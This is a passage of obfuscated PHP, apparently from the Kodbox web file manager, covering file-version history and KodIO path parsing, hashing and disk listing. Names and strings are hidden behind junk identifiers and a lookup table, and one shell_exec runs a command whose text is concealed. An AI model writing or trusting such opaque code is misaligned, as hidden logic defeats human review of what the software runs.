$—–Ò¹±Ê[$»ĞËª¾Æ[32]]); continue; } $š‚ÉÌÔ¶[] = $—–Ò¹±Ê; } return self::saveData($Ùáª ÌÏ[$»ĞËª¾Æ[1343]], $š‚ÉÌÔ¶); } public static function clear($Šíúü¢, $õ¼¼›šÙ = true) { $ˆäÊ¦­– =& $_SERVER[ˆö¿ÚÌ¼]; $Ô´Â‰å“ = self::listData($Šíúü¢, $õ¼¼›šÙ); if (!$Ô´Â‰å“) { return !1; } foreach ($Ô´Â‰å“[$ˆäÊ¦­–[448]] as $ŞÜ‚®ø’) { IO::remove($Ô´Â‰å“[$ˆäÊ¦­–[1342]] . $ŞÜ‚®ø’[$ˆäÊ¦­–[32]]); } return self::saveData($Ô´Â‰å“[$ˆäÊ¦­–[1343]], array()); } public static function moveHistory($œ‘ÊÙ‰­, $öÍÙØ«œ = '', $²–§„Ç€ = '') { $’İè…¢ã =& $_SERVER[ˆö¿ÚÌ¼]; $Ú…ùàÇ“ = self::listData($œ‘ÊÙ‰­, !1); if (!$Ú…ùàÇ“ || !$Ú…ùàÇ“[$’İè…¢ã[448]]) { return !1; } $•§½†ÉÂ = $’İè…¢ã[1330]; $öÍÙØ«œ = $öÍÙØ«œ ? $öÍÙØ«œ : get_path_this($œ‘ÊÙ‰­); $²–§„Ç€ = $²–§„Ç€ ? $²–§„Ç€ : $Ú…ùàÇ“[$’İè…¢ã[1342]]; $âíûò ‹ = substr(get_path_this($Ú…ùàÇ“[$’İè…¢ã[1343]]), 0, -strlen($•§½†ÉÂ)); foreach ($Ú…ùàÇ“[$’İè…¢ã[448]] as $Ä²™üßŠ => $«úÄó³Ÿ) { $šÚ­û = $öÍÙØ«œ . substr($«úÄó³Ÿ[$’İè…¢ã[32]], strlen($âíûò ‹)); $””‡Çú‚ = IO::move($Ú…ùàÇ“[$’İè…¢ã[1342]] . $«úÄó³Ÿ[$’İè…¢ã[32]], $²–§„Ç€, !1, $šÚ­û); if ($””‡Çú‚) { $Ú…ùàÇ“[$’İè…¢ã[448]][$Ä²™üßŠ][$’İè…¢ã[32]] = $šÚ­û; } } $Ú…ùàÇ“[$’İè…¢ã[1343]] = IO::move($Ú…ùàÇ“[$’İè…¢ã[1343]], $²–§„Ç€, !1, $öÍÙØ«œ . $•§½†ÉÂ); self::saveData($Ú…ùàÇ“[$’İè…¢ã[1343]], $Ú…ùàÇ“[$’İè…¢ã[448]]); self::clearEmptyFolder($Ú…ùàÇ“[$’İè…¢ã[1342]]); } public static function rollback($Õæ˜ı‡ï, $†ı©Íé) { $ó¶¶­¤ê =& $_SERVER[ˆö¿ÚÌ¼]; $é¸Ïúê = self::listData($Õæ˜ı‡ï); if (!$é¸Ïúê) { return; } $ˆ˜î—• = IO::info($Õæ˜ı‡ï); foreach ($é¸Ïúê[$ó¶¶­¤ê[448]] as $Ü©†ÒğŒ => $Ÿ­ÅòóÖ) { if ($Ÿ­ÅòóÖ[$ó¶¶­¤ê[478]] == $†ı©Íé) { self::add($Õæ˜ı‡ï); $Ûã º³² = $é¸Ïúê[$ó¶¶­¤ê[1342]] . $Ÿ­ÅòóÖ[$ó¶¶­¤ê[32]]; $´ñ›‡ØÅ = IO::copy($Ûã º³², IO::pathFather($Õæ˜ı‡ï), REPEAT_REPLACE, $ˆ˜î—•[$ó¶¶­¤ê[32]]); if ($´ñ›‡ØÅ) { self::remove($Õæ˜ı‡ï, $†ı©Íé); } return $´ñ›‡ØÅ; } } return !1; } public static function setDetail($ò –¾ŞÜ, $ê÷·¹£, $ñÖÀ…êú) { $ş²Şˆ =& $_SERVER[ˆö¿ÚÌ¼]; $íÌÊ‰Õ² = self::listData($ò –¾ŞÜ); if (!$íÌÊ‰Õ²) { return; } foreach ($íÌÊ‰Õ²[$ş²Şˆ[448]] as $¬â‰İÍÔ => $Äˆáñ°«) { if ($Äˆáñ°«[$ş²Şˆ[478]] == $ê÷·¹£) { $íÌÊ‰Õ²[$ş²Şˆ[448]][$¬â‰İÍÔ][$ş²Şˆ[1341]] = $ñÖÀ…êú; self::saveData($íÌÊ‰Õ²[$ş²Şˆ[1343]], $íÌÊ‰Õ²[$ş²Şˆ[448]]); return !0; } } return !1; } public static function fileInfo($Š¶ı‰…ø, $¯ãìÌ™À) { $¿„¢íÕ =& $_SERVER[ˆö¿ÚÌ¼]; $Ó¯íÁıï = self::listData($Š¶ı‰…ø); if (!$Ó¯íÁıï) { show_json(LNG($¿„¢íÕ[108]), !1); } $²òïÆÜö = $¿„¢íÕ[12]; foreach ($Ó¯íÁıï[$¿„¢íÕ[448]] as $ÊıŠ™³Ê => $›î’ÌÅ) { if ($›î’ÌÅ[$¿„¢íÕ[478]] != $¯ãìÌ™À) { continue; } $²òïÆÜö = $Ó¯íÁıï[$¿„¢íÕ[1342]] . $›î’ÌÅ[$¿„¢íÕ[32]]; break; } if (!$²òïÆÜö) { show_json(LNG($¿„¢íÕ[108]), !1); } return IO::info($²òïÆÜö); } public static function fileOut($İ÷¬—¤°, $±ŞµÓ†ö, $¶©¤¬¹® = false) { $ûñ¡õè… =& $_SERVER[ˆö¿ÚÌ¼]; $œáé‡¿Ş = self::fileInfo($İ÷¬—¤°, $±ŞµÓ†ö); $¹îÕ©‹„ =& $GLOBALS[$ûñ¡õè…[7]]; $¶©¤¬¹® = isset($¹îÕ©‹„[$ûñ¡õè…[1293]]) && $¹îÕ©‹„[$ûñ¡õè…[1293]] == 1; if (isset($¹îÕ©‹„[$ûñ¡õè…[33]]) && $¹îÕ©‹„[$ûñ¡õè…[33]] == $ûñ¡õè…[1344]) { return IO::fileOutImage($œáé‡¿Ş[$ûñ¡õè…[87]], $¹îÕ©‹„[$ûñ¡õè…[1345]]); } IO::fileOut($œáé‡¿Ş[$ûñ¡õè…[87]], $¶©¤¬¹®, get_path_this($İ÷¬—¤°)); } public static function listData($—®ÕÔ¢€, $ù°©ªšÑ = true) { $÷ÛÁ’ÅÌ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ù°©ªšÑ && !IO::exist($—®ÕÔ¢€)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($—®ÕÔ¢€, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Éïâüí = self::pathHistory($—®ÕÔ¢€); $ß»Î„± = array($÷ÛÁ’ÅÌ[1343] => $Éïâüí . $÷ÛÁ’ÅÌ[1330], $÷ÛÁ’ÅÌ[1342] => rtrim(get_path_father($Éïâüí), $÷ÛÁ’ÅÌ[8]) . $÷ÛÁ’ÅÌ[8], $÷ÛÁ’ÅÌ[448] => array()); $Â×¶èì© = IO::getContent($ß»Î„±[$÷ÛÁ’ÅÌ[1343]]); if ($Â×¶èì©) { $Ã¶„ç™® = json_decode($Â×¶èì©, !0); if (is_array($Ã¶„ç™®)) { $ß»Î„±[$÷ÛÁ’ÅÌ[448]] = $Ã¶„ç™®; } } return $ß»Î„±; } private static function saveData($ú±êì‡ü, $ÛÖºşïà) { $˜×ğİ¥ó =& $_SERVER[ˆö¿ÚÌ¼]; self::log($˜×ğİ¥ó[1346] . $ú±êì‡ü . $˜×ğİ¥ó[74] . count($ÛÖºşïà), $˜×ğİ¥ó[837]); if ($ÛÖºşïà) { return IO::setContent($ú±êì‡ü, json_encode($ÛÖºşïà)); } $ÄÔ´ò…Ó = IO::pathFather($ú±êì‡ü); IO::remove($ú±êì‡ü); self::clearEmptyFolder($ÄÔ´ò…Ó); return !0; } public static function clearEmptyFolder($†Îşé©) { $ïÈÏç¾ =& $_SERVER[ˆö¿ÚÌ¼]; if (trim($†Îşé©, $ïÈÏç¾[8]) == trim(self::$_historyBase, $ïÈÏç¾[8])) { return; } $óŸñ˜ÔŞ = IO::pathFather($†Îşé©); $ªê¥¡˜± = IO::has($†Îşé©, !0); if ($ªê¥¡˜±[$ïÈÏç¾[242]] > 0 || $ªê¥¡˜±[$ïÈÏç¾[243]] > 0) { return; } IO::remove($†Îşé©); self::clearEmptyFolder($óŸñ˜ÔŞ); } private static function getBasePath() { $«áå°Æ¾ =& $_SERVER[ˆö¿ÚÌ¼]; $„å«ë¦¨ = Model($«áå°Æ¾[1347])->get($«áå°Æ¾[1348]); if ($„å«ë¦¨) { if (!IO::exist($„å«ë¦¨)) { IO::mkdir($„å«ë¦¨); } if (get_path_this($„å«ë¦¨) == $«áå°Æ¾[1333]) { $‘ÙçõÔÀ = $«áå°Æ¾[1349] . rand_string(8); @rename($„å«ë¦¨, get_path_father($„å«ë¦¨) . $«áå°Æ¾[8] . $‘ÙçõÔÀ); $„å«ë¦¨ = DATA_PATH . $‘ÙçõÔÀ . $«áå°Æ¾[8]; file_put_contents(DATA_PATH . $«áå°Æ¾[1280], $«áå°Æ¾[12]); Model($«áå°Æ¾[1347])->set($«áå°Æ¾[1348], $„å«ë¦¨); } return $„å«ë¦¨; } $„å«ë¦¨ = DATA_PATH . $«áå°Æ¾[1349] . rand_string(8) . $«áå°Æ¾[8]; $„å«ë¦¨ = IO::mkdir($„å«ë¦¨); $„å«ë¦¨ = rtrim($„å«ë¦¨, $«áå°Æ¾[8]) . $«áå°Æ¾[8]; file_put_contents($„å«ë¦¨ . $«áå°Æ¾[1280], $«áå°Æ¾[12]); file_put_contents(DATA_PATH . $«áå°Æ¾[1280], $«áå°Æ¾[12]); Model($«áå°Æ¾[1347])->set($«áå°Æ¾[1348], $„å«ë¦¨); return $„å«ë¦¨; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\x52\x65\143\x79\143\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\x46\x69\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\x72\x46\151\154\x65\x54\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\x70\x52\x6f\157\x74\x53\145\154\146\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\x72\123\x68\x61\x72\145\114\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\x65\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\162\x65\111\164\145\155\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\x72\143\150\175"; const KOD_BLOCK = "\173\142\x6c\157\143\153\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\145\162\175"; public static function typeList() { $½§Ÿ´ƒ¡ =& $_SERVER[ˆö¿ÚÌ¼]; return array($½§Ÿ´ƒ¡[1350] => self::KOD_SOURCE, $½§Ÿ´ƒ¡[1351] => self::KOD_USER_RECYCLE, $½§Ÿ´ƒ¡[1352] => self::KOD_USER_FAV, $½§Ÿ´ƒ¡[1353] => self::KOD_USER_FILE_TAG, $½§Ÿ´ƒ¡[1354] => self::KOD_USER_FILE_TYPE, $½§Ÿ´ƒ¡[1355] => self::KOD_GROUP_ROOT_SELF, $½§Ÿ´ƒ¡[1356] => self::KOD_USER_SHARE, $½§Ÿ´ƒ¡[1357] => self::KOD_USER_SHARE_LINK, $½§Ÿ´ƒ¡[1358] => self::KOD_USER_SHARE_TO_ME, $½§Ÿ´ƒ¡[1359] => self::KOD_SHARE_ITEM, $½§Ÿ´ƒ¡[1360] => self::KOD_SHARE_LINK, $½§Ÿ´ƒ¡[1361] => self::KOD_SEARCH, $½§Ÿ´ƒ¡[1362] => self::KOD_BLOCK, $½§Ÿ´ƒ¡[1363] => self::KOD_IO, $½§Ÿ´ƒ¡[1364] => self::KOD_USER_RECENT, $½§Ÿ´ƒ¡[1365] => self::KOD_USER_DRIVER); } public static function parse($è ãÙÊÑ) { $…ĞÓÉ…Ç =& $_SERVER[ˆö¿ÚÌ¼]; $è ãÙÊÑ = self::clear($è ãÙÊÑ); $ƒ¯Ö„ = array_values(self::typeList()); preg_match($…ĞÓÉ…Ç[1366], $è ãÙÊÑ, $‚‡¾«»™); $˜Ÿ¥£ûŞ = array($…ĞÓÉ…Ç[508] => !1, $…ĞÓÉ…Ç[1367] => !1, $…ĞÓÉ…Ç[505] => !1, $…ĞÓÉ…Ç[87] => $è ãÙÊÑ, $…ĞÓÉ…Ç[1265] => !1, $…ĞÓÉ…Ç[1264] => $…ĞÓÉ…Ç[12]); if (is_array($‚‡¾«»™) && count($‚‡¾«»™) == 5) { $±Ø±™í = $…ĞÓÉ…Ç[1368] . $‚‡¾«»™[2] . $…ĞÓÉ…Ç[405]; if (in_array($±Ø±™í, $ƒ¯Ö„)) { $˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[1265]] = $‚‡¾«»™[1]; $˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[33]] = $±Ø±™í; $˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[1369]] = substr($±Ø±™í, 1, -1); $˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[478]] = $‚‡¾«»™[3]; } $˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[1264]] = $‚‡¾«»™[4]; } $Í°Ëñ = array($…ĞÓÉ…Ç[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[1332]] = in_array($˜Ÿ¥£ûŞ[$…ĞÓÉ…Ç[33]], $Í°Ëñ); return $˜Ÿ¥£ûŞ; } public static function isTruePath($ßôŠº±) { $­½åü =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($ßôŠº±, 0, 1) != $­½åü[1368]) { return !0; } if (strpos($ßôŠº±, $­½åü[495]) === 0) { return !0; } if (strpos($ßôŠº±, $­½åü[1336]) === 0) { return !0; } if (strpos($ßôŠº±, $­½åü[1370]) === 0) { return !0; } if (strpos($ßôŠº±, $­½åü[1371]) === 0) { return !0; } if (strpos($ßôŠº±, $­½åü[1372]) === 0) { return !0; } return !1; } public static function clear($ì”íË°›) { $”»Å¬¹Í =& $_SERVER[ˆö¿ÚÌ¼]; $ì”íË°› = str_replace(array($”»Å¬¹Í[1170], $”»Å¬¹Í[288]), $”»Å¬¹Í[53], $ì”íË°›); $ì”íË°› = str_replace($”»Å¬¹Í[100], $”»Å¬¹Í[8], $ì”íË°›); $µ÷¦¿¦ = $”»Å¬¹Í[1373]; if (substr($ì”íË°›, 0, 3) == $”»Å¬¹Í[1374]) { $ì”íË°› = substr($ì”íË°›, 3); } while (strstr($ì”íË°›, $µ÷¦¿¦)) { $ì”íË°› = str_replace($µ÷¦¿¦, $”»Å¬¹Í[8], $ì”íË°›); } $ì”íË°› = preg_replace($”»Å¬¹Í[1375], $”»Å¬¹Í[8], $ì”íË°›); if ($ì”íË°› == $”»Å¬¹Í[8]) { return $”»Å¬¹Í[8]; } $ì”íË°› = rtrim($ì”íË°›, $”»Å¬¹Í[8]); return $ì”íË°›; } public static function pathTrue($ïµöÌ©½) { $¹ã‡à¯Ô =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ïµöÌ©½) { return $¹ã‡à¯Ô[12]; } $ïµöÌ©½ = str_replace($¹ã‡à¯Ô[257], $¹ã‡à¯Ô[8], str_replace($¹ã‡à¯Ô[1376], $¹ã‡à¯Ô[8], $ïµöÌ©½)); $ïµöÌ©½ = str_replace($¹ã‡à¯Ô[257], $¹ã‡à¯Ô[8], str_replace($¹ã‡à¯Ô[1376], $¹ã‡à¯Ô[8], $ïµöÌ©½)); if (!strstr($ïµöÌ©½, $¹ã‡à¯Ô[1374])) { return $ïµöÌ©½; } $ËèÁÕ„… = explode($¹ã‡à¯Ô[8], $ïµöÌ©½); foreach ($ËèÁÕ„… as $¬©„à­ˆ => $¯´ìü±) { if ($¯´ìü± !== $¹ã‡à¯Ô[1377]) { continue; } for ($¥µŠ¤¹ = $¬©„à­ˆ; $¥µŠ¤¹ >= 0; $¥µŠ¤¹--) { if ($ËèÁÕ„…[$¥µŠ¤¹] === $¹ã‡à¯Ô[10] || $ËèÁÕ„…[$¥µŠ¤¹] === $¹ã‡à¯Ô[1377] || $ËèÁÕ„…[$¥µŠ¤¹] === -1) { continue; } if ($ËèÁÕ„…[$¥µŠ¤¹] === $¹ã‡à¯Ô[12]) { $ËèÁÕ„…[$¬©„à­ˆ] = -1; break; } $ËèÁÕ„…[$¬©„à­ˆ] = -1; $ËèÁÕ„…[$¥µŠ¤¹] = -1; break; } } $©âÚÖıš = array(); foreach ($ËèÁÕ„… as $¯´ìü±) { if ($¯´ìü± !== -1) { $©âÚÖıš[] = $¯´ìü±; } } $üĞŸ”‘ = implode($¹ã‡à¯Ô[8], $©âÚÖıš); if (strpos($üĞŸ”‘, $¹ã‡à¯Ô[1378]) === 0) { $üĞŸ”‘ = $¹ã‡à¯Ô[1374] . substr($üĞŸ”‘, strlen($¹ã‡à¯Ô[1378])); } return $üĞŸ”‘; } public static function pathUrlClear($§¢íÛÒà) { $ÛÀŒ…® =& $_SERVER[ˆö¿ÚÌ¼]; if (!$§¢íÛÒà) { return $§¢íÛÒà; } $§¢íÛÒà = rawurldecode($§¢íÛÒà); $§¢íÛÒà = str_replace($ÛÀŒ…®[1376], $ÛÀŒ…®[8], $§¢íÛÒà); if (strpos($§¢íÛÒà, $ÛÀŒ…®[76]) > 0) { $§¢íÛÒà = substr($§¢íÛÒà, 0, strpos($§¢íÛÒà, $ÛÀŒ…®[76])); } if (strpos($§¢íÛÒà, $ÛÀŒ…®[1379]) > 0) { $§¢íÛÒà = substr($§¢íÛÒà, 0, strpos($§¢íÛÒà, $ÛÀŒ…®[1379])); } return $§¢íÛÒà; } public static function sourceID($ê¯½‡…“) { $÷Ô§‡—Û =& $_SERVER[ˆö¿ÚÌ¼]; $È³ŠëîÕ = self::parse($ê¯½‡…“); if ($È³ŠëîÕ[$÷Ô§‡—Û[33]] !== self::KOD_SOURCE) { show_json(LNG($÷Ô§‡—Û[1380]), !1); } return $È³ŠëîÕ[$÷Ô§‡—Û[478]]; } public static function make($é¼½¾‰ó) { if (!$é¼½¾‰ó) { return !1; } return self::makePath(self::KOD_SOURCE, intval($é¼½¾‰ó)); } public static function makeShare($Öü²­¨‰, $ãµµÃñ) { return self::makePath(self::KOD_SHARE_ITEM, $Öü²­¨‰, $ãµµÃñ); } public static function makeFileTypePath($è®±Á®) { return self::makePath(self::KOD_USER_FILE_TYPE, $è®±Á®); } public static function makeFileTagPath($£æÀ¹”) { return self::makePath(self::KOD_USER_FILE_TAG, $£æÀ¹”); } public static function makePath($‰ûÙÑæ, $Üû“´¯¿ = '', $È¸ñˆÖ§ = '') { $ª¨®­şì =& $_SERVER[ˆö¿ÚÌ¼]; $›¸ä× = substr($‰ûÙÑæ, 1, -1); $‡·Èªå÷ = $ª¨®­şì[1381] . $›¸ä× . $ª¨®­şì[1382] . $Üû“´¯¿ . $ª¨®­şì[1383]; $‡·Èªå÷ = $È¸ñˆÖ§ ? $‡·Èªå÷ . $È¸ñˆÖ§ . $ª¨®­şì[8] : $‡·Èªå÷; return $‡·Èªå÷; } public static function hashPath($À—Ó‰é¶, $÷Ş˜£¤¥ = false) { $Ã¡©› =& $_SERVER[ˆö¿ÚÌ¼]; $¹Û„åÊŒ = is_array($À—Ó‰é¶) ? $À—Ó‰é¶ : IO::info($À—Ó‰é¶); $•úšõŞ‘ = _get($¹Û„åÊŒ, $Ã¡©›[1384], $Ã¡©›[12]); if (!$•úšõŞ‘ && isset($¹Û„åÊŒ[$Ã¡©›[238]])) { $•úšõŞ‘ = trim($¹Û„åÊŒ[$Ã¡©›[238]], $Ã¡©›[121]); } if ($•úšõŞ‘) { return $•úšõŞ‘; } if (!$•úšõŞ‘ && isset($¹Û„åÊŒ[$Ã¡©›[194]]) && $¹Û„åÊŒ[$Ã¡©›[194]]) { $¹Û„åÊŒ = IO::info(KodIO::make($¹Û„åÊŒ[$Ã¡©›[194]])); $•úšõŞ‘ = _get($¹Û„åÊŒ, $Ã¡©›[1384], $Ã¡©›[12]); } $Ö±±³—¤ = md5($¹Û„åÊŒ[$Ã¡©›[87]] . $¹Û„åÊŒ[$Ã¡©›[79]] . $¹Û„åÊŒ[$Ã¡©›[88]]); $ë ™¼¯À = $Ö±±³—¤ . $Ã¡©›[1385]; $•úšõŞ‘ = $•úšõŞ‘ ? $•úšõŞ‘ : Cache::get($ë ™¼¯À); if (!$•úšõŞ‘ && $÷Ş˜£¤¥) { $•úšõŞ‘ = IO::hashSimple($¹Û„åÊŒ[$Ã¡©›[87]]); Cache::set($ë ™¼¯À, $•úšõŞ‘ ? $•úšõŞ‘ : $Ö±±³—¤, 3600 * 24 * 30); } return $•úšõŞ‘ ? $•úšõŞ‘ : $Ö±±³—¤; } public static function hashPathSafe($˜“’ÃÅ, $§Ïê£‚ù = false) { $÷ÏÚ„²Â =& $_SERVER[ˆö¿ÚÌ¼]; $…É§Ñİ¸ = self::hashPath($˜“’ÃÅ, $§Ïê£‚ù); return md5($…É§Ñİ¸ . $÷ÏÚ„²Â[1386] . Model($÷ÏÚ„²Â[855])->get($÷ÏÚ„²Â[856])); } public static function initSystemPath() { $¡šÎ­— =& $_SERVER[ˆö¿ÚÌ¼]; if (defined($¡šÎ­—[1387])) { return; } define($¡šÎ­—[1387], self::systemPath($¡šÎ­—[192])); define($¡šÎ­—[1388], self::systemPath($¡šÎ­—[1389])); define($¡šÎ­—[1390], self::systemPath($¡šÎ­—[1391])); define($¡šÎ­—[1392], self::systemPath($¡šÎ­—[1393])); IOHistory::bindEvent(); } public static function systemPath($¸ã¥»•’) { $ÚÍ§›ù =& $_SERVER[ˆö¿ÚÌ¼]; $Á—±èÈî = $ÚÍ§›ù[1394] . ucfirst($¸ã¥»•’); $³‘²Í÷ = Model($ÚÍ§›ù[855])->get($Á—±èÈî); if ($³‘²Í÷) { return $³‘²Í÷; } if ($¸ã¥»•’ == $ÚÍ§›ù[192]) { $³‘²Í÷ = self::make(Model($ÚÍ§›ù[915])->systemRootPathAdd($ÚÍ§›ù[622])); } else { $³‘²Í÷ = self::systemPath($ÚÍ§›ù[192]); $¾›ù‚Ë‰ = self::sourceID($³‘²Í÷); $³‘²Í÷ = self::make(Model($ÚÍ§›ù[915])->mkdir($¾›ù‚Ë‰, $¸ã¥»•’)); } Model($ÚÍ§›ù[855])->set($Á—±èÈî, $³‘²Í÷); return $³‘²Í÷; } public static function systemFolder($üäú´´–) { $ôâŸ˜•‘ = IO_PATH_SYSTEM_SOURCE . $üäú´´–; $öÉ¢·ı = Cache::get($ôâŸ˜•‘); if (!$öÉ¢·ı) { $ï›à¦Â¿ = IO::infoFullSimple($ôâŸ˜•‘); if (!$ï›à¦Â¿) { $öÉ¢·ı = IO::mkdir($ôâŸ˜•‘, REPEAT_SKIP); } else { $öÉ¢·ı = $ï›à¦Â¿[$_SERVER[ˆö¿ÚÌ¼][87]]; } Cache::set($ôâŸ˜•‘, $öÉ¢·ı, 3600 * 10); } return $öÉ¢·ı; } public static function defaultDriver() { return Model($_SERVER[ˆö¿ÚÌ¼][852])->defaultDriver(); } public static function defaultIO() { $ã¿ï©™³ =& $_SERVER[ˆö¿ÚÌ¼]; $¿è¯¾°Ì = self::defaultDriver(); return $ã¿ï©™³[1395] . $¿è¯¾°Ì[$ã¿ï©™³[478]] . $ã¿ï©™³[1383]; } public static function defaultDriverInit() { static $òóŠ£Ÿğ = false; if ($òóŠ£Ÿğ) { return $òóŠ£Ÿğ; } $òóŠ£Ÿğ = IO::init(self::defaultIO()); return $òóŠ£Ÿğ; } public static function fileTypeList() { $œ¿Ü¿œä =& $_SERVER[ˆö¿ÚÌ¼]; $‹ÈÏ—°¼ = $GLOBALS[$œ¿Ü¿œä[6]][$œ¿Ü¿œä[1396]]; foreach ($‹ÈÏ—°¼ as $ß»‰˜âü => $¥Ü¥Ä÷ú) { $¤ê¥ÀùÑ = $œ¿Ü¿œä[1397] . $ß»‰˜âü; $œÊ²Ê¨’ = LNG($¤ê¥ÀùÑ); if ($¤ê¥ÀùÑ != $œÊ²Ê¨’) { $‹ÈÏ—°¼[$ß»‰˜âü][$œ¿Ü¿œä[32]] = $œÊ²Ê¨’; } } return $‹ÈÏ—°¼; } public static function diskList($÷‘úš¦ú = true) { $†ÍÌ¯à = $_SERVER[ˆö¿ÚÌ¼][1398]; if ($÷‘úš¦ú) { $õ¾İæ½Æ = Cache::get($†ÍÌ¯à); if (is_array($õ¾İæ½Æ)) { return $õ¾İæ½Æ; } } $õ¾İæ½Æ = self::diskListGet(); Cache::set($†ÍÌ¯à, $õ¾İæ½Æ, 60); return $õ¾İæ½Æ; } public static function diskListGet() { $æ±ô†¦¿ =& $_SERVER[ˆö¿ÚÌ¼]; $şœ×…” = array(); if ($GLOBALS[$æ±ô†¦¿[6]][$æ±ô†¦¿[1399]] == $æ±ô†¦¿[1400]) { $ÌòÆ­éÂ = $æ±ô†¦¿[1401]; for ($ŠëÌÕò² = 0; $ŠëÌÕò² < strlen($ÌòÆ­éÂ); $ŠëÌÕò²++) { $§ÂÉëïâ = $ÌòÆ­éÂ[$ŠëÌÕò²] . $æ±ô†¦¿[1402]; if (file_exists($§ÂÉëïâ)) { $şœ×…”[] = $§ÂÉëïâ; } } return $şœ×…”; } if (!function_exists($æ±ô†¦¿[101])) { $şœ×…”[] = $æ±ô†¦¿[926]; return $şœ×…”; } $½±Òí„Ğ = explode($æ±ô†¦¿[288], shell_exec($æ±ô†¦¿[1403])); array_shift($½±Òí„Ğ); array_pop($½±Òí„Ğ); $äœØ¿ôÔ = array($æ±ô†¦¿[1404], $æ±ô†¦¿[1405], $æ±ô†¦¿[1406], $æ±ô†¦¿[1407], $æ±ô†¦¿[1408], $æ±ô†¦¿[1409], $æ±ô†¦¿[1410], $æ±ô†¦¿[1411]); foreach ($½±Òí„Ğ as $ ³îÑöĞ) { $Â®Ò²ŠÄ = preg_split($æ±ô†¦¿[1412], $ ³îÑöĞ); $§ÂÉëïâ = $Â®Ò²ŠÄ[count($Â®Ò²ŠÄ) - 1]; if (!strstr($Â®Ò²ŠÄ[0], $æ±ô†¦¿[1413]) || !$§ÂÉëïâ) { continue; } $¨õ¸Ñ‡ = rtrim($§ÂÉëïâ, $æ±ô†¦¿[8]) . $æ±ô†¦¿[8]; if (in_array($¨õ¸Ñ‡, $äœØ¿ôÔ)) { continue; } $şœ×…”[] = $¨õ¸Ñ‡; } return $şœ×…”; } public static function isSameDisk($´óëœÀ, $Ô­øÆ²ï) { $ŞÒğÇ‡É =& $_SERVER[ˆö¿ÚÌ¼]; if ($GLOBALS[$ŞÒğÇ‡É[6]][$ŞÒğÇ‡É[1399]] == $ŞÒğÇ‡É[1400]) { return strtolower(substr($´óëœÀ, 0, 1)) == strtolower(substr($Ô­øÆ²ï, 0, 1)); } $šøú™‡ = stat($´óëœÀ); $À¸ÍáÄÖ = stat($Ô­øÆ²ï); if ($šøú™‡ === !1 || $À¸ÍáÄÖ === !1) { return !1; } return $šøú™‡[$ŞÒğÇ‡É[1414]] === $À¸ÍáÄÖ[$ŞÒğÇ‡É[1414]]; $Å‰•Â¬‡ = self::diskList(); $Öõæ³Ëó = !1; $Ú‰ºùú¦ = !1; sort($Å‰•Â¬‡); $Å‰•Â¬‡ = array_reverse($Å‰•Â¬‡); $´óëœÀ = rtrim($´óëœÀ, $ŞÒğÇ‡É[8]) . $ŞÒğÇ‡É[8]; $Ô­øÆ²ï = rtrim($Ô­øÆ²ï, $ŞÒğÇ‡É[8]) . $ŞÒğÇ‡É[8]; foreach ($Å‰•Â¬‡ as $ù½â¹«) { $Œ‰¢­‰¹ = strlen($ù½â¹«); if (!$Öõæ³Ëó && substr($´óëœÀ, 0, $Œ‰¢­‰¹) == $ù½â¹«) { $Öõæ³Ëó = $ù½â¹«; } if (!$Ú‰ºùú¦ && substr($Ô­øÆ²ï, 0, $Œ‰¢­‰¹) == $ù½â¹«) { $Ú‰ºùú¦ = $ù½â¹«; } if ($Öõæ³Ëó && $Ú‰ºùú¦) { break; } } return $Öõæ³Ëó === $Ú‰ºùú¦; } public static function transferType($ıäÕ™ô›, $ı å±ı«) { $ÆæˆĞ© =& $_SERVER[ˆö¿ÚÌ¼]; $½¡ó’·è = self::driverType($ıäÕ™ô›); $ñŠÀËÀ§ = self::driverType($ı å±ı«); if ($½¡ó’·è[$ÆæˆĞ©[33]] == $ñŠÀËÀ§[$ÆæˆĞ©[33]] && $½¡ó’·è[$ÆæˆĞ©[1415]] == $ñŠÀËÀ§[$ÆæˆĞ©[1415]]) { return $ÆæˆĞ©[1416]; } if ($½¡ó’·è[$ÆæˆĞ©[33]] == $ÆæˆĞ©[960] && $ñŠÀËÀ§[$ÆæˆĞ©[33]] == $ÆæˆĞ©[109]) { return $ÆæˆĞ©[1293]; } if ($½¡ó’·è[$ÆæˆĞ©[33]] == $ÆæˆĞ©[109] && $ñŠÀËÀ§[$ÆæˆĞ©[33]] == $ÆæˆĞ©[960]) { return $ÆæˆĞ©[110]; } return $ÆæˆĞ©[1417]; } public static function driverType($òŠÊ³Å¤) { $ÈÛ‰ËÙÄ =& $_SERVER[ˆö¿ÚÌ¼]; $ñÂ¿’Ô‘ = str_replace($ÈÛ‰ËÙÄ[1418], $ÈÛ‰ËÙÄ[12], strtolower($òŠÊ³Å¤->getType())); if 